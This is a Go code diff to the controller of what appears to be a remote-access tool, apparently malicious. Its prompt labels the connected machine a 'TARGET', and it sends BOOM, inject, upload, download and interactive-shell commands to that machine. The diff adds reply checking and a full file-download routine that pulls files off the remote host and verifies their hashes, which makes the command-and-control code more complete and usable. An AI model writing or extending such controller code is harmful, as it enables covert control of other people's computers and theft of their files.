@@ -69,7 +69,7 @@ func handleClient(conn net.Conn) {
 	}
 	defer cleanup()
 	for true {
-		fmt.Printf("[SERVER] %s [>_] $ ", conn.RemoteAddr().String())
+		fmt.Printf("[ TARGET %s ] [>_] Controller $ ", conn.RemoteAddr().String())
 		useript := utils.ReadUserInput()
 		useriptD := strings.Split(useript, " ")
 		recvconn, err := ymserv.Accept()
@@ -85,13 +85,34 @@ func handleClient(conn net.Conn) {
 			log.Println(err)
 			continue
 		}
-		_ = UserCommandProcess(userCmd, recvconn)
+		_ = userCommandProcess(userCmd, recvconn)
 	}
 }
 
-func UserCommandProcess(ucmd *remoteop.UserCmd, ctrlstem net.Conn) error {
+func checkRemoteResp(ctrlstem net.Conn) (*remoteop.CmdMsg, error) {
+	smbuf := make([]byte, 1300)
+	rdint, err := ctrlstem.Read(smbuf)
+	if rdint == 0 || err != nil {
+		log.Println(err)
+		return nil, err
+	}
+	resp := &remoteop.CmdMsg{}
+	err = json.Unmarshal(smbuf[0:rdint], resp)
+	if err != nil {
+		log.Println(err)
+		return resp, err
+	}
+	if resp.Status > remoteop.StatusFinishTrans {
+		err = errors.New(resp.Msg)
+		log.Println(err)
+		return resp, err
+	}
+	return resp, nil
+}
+
+func userCommandProcess(ucmd *remoteop.UserCmd, ctrlstem net.Conn) error {
 	var curcmdmsg *remoteop.CmdMsg
-	switch ucmd.Cmd{
+	switch ucmd.Cmd {
 	case remoteop.CommandBOOM:
 		curcmdmsg = &remoteop.CmdMsg{
 			Status:      0,
@@ -112,7 +133,8 @@ func UserCommandProcess(ucmd *remoteop.UserCmd, ctrlstem net.Conn) error {
 			log.Println(err)
 			return err
 		}
-		//todo: reply parse
+		_, err = checkRemoteResp(ctrlstem)
+		return err
 	case remoteop.CommandINJE:
 		curcmdmsg = &remoteop.CmdMsg{
 			Status:      0,
@@ -133,7 +155,7 @@ func UserCommandProcess(ucmd *remoteop.UserCmd, ctrlstem net.Conn) error {
 			log.Println(err)
 			return err
 		}
-		//todo: reply parse
+		_, err = checkRemoteResp(ctrlstem)
 	case remoteop.CommandUPLD:
 		data, err := ioutil.ReadFile(ucmd.OptionLCL)
 		if err != nil {
@@ -142,12 +164,12 @@ func UserCommandProcess(ucmd *remoteop.UserCmd, ctrlstem net.Conn) error {
 		}
 		sha256hex := fmt.Sprintf("%x", sha256.Sum256(data))
 		curcmdmsg = &remoteop.CmdMsg{
-			Status: 		0,
+			Status:      0,
 			Cmd:         remoteop.CommandUPLD,
 			Msg:         ucmd.OptionRMT,
 			NextIsBin:   true,
-			HasNext: true,
-			NextSize: len(data),
+			HasNext:     true,
+			NextSize:    len(data),
 			NextBinHash: sha256hex,
 		}
 		cmddata, err := json.Marshal(curcmdmsg)
@@ -160,7 +182,10 @@ func UserCommandProcess(ucmd *remoteop.UserCmd, ctrlstem net.Conn) error {
 			log.Println(err)
 			return err
 		}
-		//todo: parse reply
+		_, err = checkRemoteResp(ctrlstem)
+		if err != nil {
+			return err
+		}
 		datastem, err := ymserv.Accept()
 		if err != nil {
 			log.Println(err)
@@ -172,17 +197,85 @@ func UserCommandProcess(ucmd *remoteop.UserCmd, ctrlstem net.Conn) error {
 			_ = datastem.Close()
 			return err
 		}
+		_, err = checkRemoteResp(ctrlstem)
+		if err != nil {
+			_ = datastem.Close()
+			return err
+		}
 		_ = datastem.Close()
 	case remoteop.CommandDWLD:
-
+		curcmdmsg = &remoteop.CmdMsg{
+			Status:      0,
+			Cmd:         remoteop.CommandDWLD,
+			Msg:         ucmd.OptionRMT,
+			NextIsBin:   false,
+			HasNext:     false,
+			NextSize:    0,
+			NextBinHash: "",
+		}
+		cmddata, err := json.Marshal(curcmdmsg)
+		if err != nil {
+			log.Println(err)
+			return err
+		}
+		_, err = ctrlstem.Write(cmddata)
+		if err != nil {
+			log.Println(err)
+			return err
+		}
+		rmtfddata, err := checkRemoteResp(ctrlstem)
+		if err != nil {
+			return err
+		}
+		if rmtfddata.NextSize == 0 || !rmtfddata.HasNext {
+			return errors.New("Unknown internal error.")
+		}
+		datastem, err := ymserv.Accept()
+		if err != nil {
+			log.Println(err)
+			return err
+		}
+		var buf bytes.Buffer
+		for ; buf.Len() < rmtfddata.NextSize; {
+			smbuf := make([]byte, 1400)
+			readint, err := datastem.Read(smbuf)
+			if err != nil || readint == 0 {
+				log.Println(err)
+				break
+			}
+			buf.Write(smbuf[0:readint])
+		}
+		_ = datastem.Close()
+		// create a new empty file to check if writable
+		err = ioutil.WriteFile(ucmd.OptionLCL, []byte{0x01}, 0644)
+		if err != nil {
+			log.Println(err)
+			return err
+		} else {
+			err = os.Remove(ucmd.OptionLCL)
+			if err != nil {
+				log.Println(err)
+				return err
+			}
+		}
+		// write to file and check sha256
+		err = ioutil.WriteFile(ucmd.OptionLCL, buf.Bytes(), 0644)
+		if err != nil {
+			log.Println(err)
+			return err
+		}
+		if rmtfddata.NextBinHash != fmt.Sprintf("%x", sha256.Sum256(buf.Bytes())) {
+			log.Println("** NOTE: THE DATA TRANSFERED MIGHT CORRUPTED, PLEASE VERIFY. **")
+			return nil
+		}
 	case remoteop.CommandBASH:
 		curcmdmsg = &remoteop.CmdMsg{
 			Status:      0,
 			Cmd:         remoteop.CommandBASH,
 			Msg:         "",
-			HasNext:     true,    // indicates new stream
-			NextIsBin:   true,	  // indicates no json encoding
-			NextSize:    -1,		// indicates dynamic content
+			HasNext:     true, // indicates new stream
+			NextIsBin:   true, // indicates no json encoding
+			NextSize:    -1,   // indicates dynamic content
 			NextBinHash: "",
 		}
 		data, err := json.Marshal(curcmdmsg)
@@ -190,7 +283,12 @@ func UserCommandProcess(ucmd *remoteop.UserCmd, ctrlstem net.Conn) error {
 			log.Println(err)
 			return err
 		}
-		_ , err = ctrlstem.Write(data)
+		_, err = ctrlstem.Write(data)
+		if err != nil {
+			log.Println(err)
+			return err
+		}
+		_, err = checkRemoteResp(ctrlstem)
 		if err != nil {
 			log.Println(err)
 			return err
